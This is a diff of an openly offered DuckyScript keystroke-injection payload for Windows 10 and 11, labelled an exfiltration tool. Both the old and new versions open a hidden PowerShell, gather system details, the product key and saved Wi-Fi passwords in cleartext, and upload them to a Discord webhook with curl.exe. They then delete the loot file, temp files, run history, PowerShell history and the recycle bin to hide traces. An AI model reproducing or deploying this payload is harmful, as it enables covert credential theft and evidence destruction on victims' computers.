@@ -5,12 +5,12 @@ REM and notepad. First a hidden powershell is opened, and a payload is deployed 
 REM system information. Then a notepad file named loot is created with all the gleaned information, and hidden in 
 REM the public Users folder C:\Users\Public\loot.txt of the target system. The loot is then exfiltrated using a 
 REM Discord webhook. In the final stage of the payload the loot.txt file, the recycling bin contents, the temp 
-REM folder contents and powershell history are all deleted. 
+REM folder contents and powershell history are all deleted.
+REM This payload deployed, and was completed in a test run in 15.60 seconds
 REM Target: Windows 10 & 11
 REM Props: iamjakoby, HAK5 and a huge shout out to O.MG!!!
 REM Version: 3.0
 REM Category: Exfiltration
-
 
 
 DELAY 500
@@ -19,139 +19,40 @@ DELAY 200
 STRING powershell -windowstyle hidden
 DELAY 200
 ENTER
-DELAY 200
-STRING Get-CimInstance -ClassName SoftwareLicensingService | Select-Object -ExpandProperty OA3xOriginalProductKey | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 2000
-ENTER
-DELAY 1000
-STRING Get-CimInstance -ClassName Win32_ComputerSystem | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 1000
-ENTER
-DELAY 1000
-STRING systeminfo | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 1000
-ENTER
-DELAY 1000
-STRING Get-DnsClient | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 1000
-ENTER
-DELAY 1000
-STRING Get-ComputerInfo | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 2000
-ENTER
-DELAY 1000
-STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 1000
-ENTER
-DELAY 1000
-STRING Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 1000
-ENTER
-DELAY 1000
-STRING Get-CimInstance -ClassName Win32_BIOS | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 1000
-ENTER
-DELAY 1000
-STRING Get-CimInstance -ClassName Win32_Processor | Select-Object -ExcludeProperty "CIM*" | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 1000
-ENTER
-DELAY 1000
-STRING function Upload-Discord {
-DELAY 1000
-ENTER
-DELAY 1000
-STRING [CmdletBinding()]
-DELAY 1000
-ENTER
-DELAY 1000
-STRING param (
-DELAY 1000
-ENTER
-DELAY 1000
-STRING [parameter(Position=0,Mandatory=$False)]
-DELAY 1000
-ENTER
-DELAY 1000
-STRING [string]$file,
-DELAY 1000
-ENTER
-DELAY 1000
-STRING [parameter(Position=1,Mandatory=$False)]
-DELAY 1000
-ENTER
-DELAY 1000
-STRING [string]$text 
-DELAY 21000
-ENTER
-DELAY 1000
-STRING )
-DELAY 1000
-ENTER
-DELAY 1000
-STRING $hookurl = 'YOUR DISCORD WEBHOOK HERE'
-DELAY 1000
-ENTER
-DELAY 1000
-STRING $Body = @{
-DELAY 1000
-ENTER
-DELAY 1000
-STRING 'username' = $env:"YOUR DISCORD USERNAME HERE"
-DELAY 1000
-ENTER
-DELAY 1000
-STRING 'content' = $text
-DELAY 1000
-ENTER
-DELAY 1000
-STRING }
-DELAY 1000
-ENTER
-DELAY 1000
-STRING if (-not ([string]::IsNullOrEmpty($text))){
-DELAY 1000
-ENTER
-DELAY 1000
-STRING Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body |  ConvertTo-Json)};
-DELAY 1000
-ENTER
-DELAY 1000
-STRING curl.exe -F "file1=@$file" $hookurl
-DELAY 1000
-ENTER
-DELAY 1000
-STRING if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
-DELAY 1000
-ENTER
-DELAY 1000
-STRING }
-DELAY 1000
-ENTER
-DELAY 1000
-STRING Upload-Discord -file "C:\Users\Public\loot.txt"
-DELAY 1000
-ENTER
-DELAY 1000
-STRING Remove-Item "C:\Users\Public\loot.txt"
-DELAY 1000
-ENTER
-DELAY 1000
-STRING rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-DELAY 1000
-ENTER
-DELAY 1000
-STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-DELAY 1000
-ENTER
-DELAY 1000
-STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
-DELAY 1000
-ENTER
-DELAY 1000
-STRING Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-DELAY 200
-ENTER
-DELAY 200
-STRING exit
-DELAY 200
-ENTER
+DELAY 500
+STRINGLN
+Get-CimInstance -ClassName SoftwareLicensingService | Select-Object -ExpandProperty OA3xOriginalProductKey | Out-File C:\Users\Public\loot.txt -Force -append
+Get-CimInstance -ClassName Win32_ComputerSystem | Out-File C:\Users\Public\loot.txt -Force -append
+systeminfo | Out-File C:\Users\Public\loot.txt -Force -append
+Get-DnsClient | Out-File C:\Users\Public\loot.txt -Force -append
+Get-ComputerInfo | Out-File C:\Users\Public\loot.txt -Force -append
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File C:\Users\Public\loot.txt -Force -append
+Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" | Out-File C:\Users\Public\loot.txt -Force -append
+Get-CimInstance -ClassName Win32_BIOS | Out-File C:\Users\Public\loot.txt -Force -append
+Get-CimInstance -ClassName Win32_Processor | Select-Object -ExcludeProperty "CIM*" | Out-File C:\Users\Public\loot.txt -Force -append
+function Upload-Discord {
+[CmdletBinding()]
+param (
+[parameter(Position=0,Mandatory=$False)]
+[string]$file,
+[parameter(Position=1,Mandatory=$False)]
+[string]$text 
+)
+$hookurl = 'YOUR DISCORD WEBHOOK HERE'
+$Body = @{
+'username' = $env:"YOUR DISCORD USERNAME HERE"
+'content' = $text
+}
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body |  ConvertTo-Json)};
+curl.exe -F "file1=@$file" $hookurl
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+Upload-Discord -file "C:\Users\Public\loot.txt"
+Remove-Item "C:\Users\Public\loot.txt"
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+exit
+END_STRINGLN
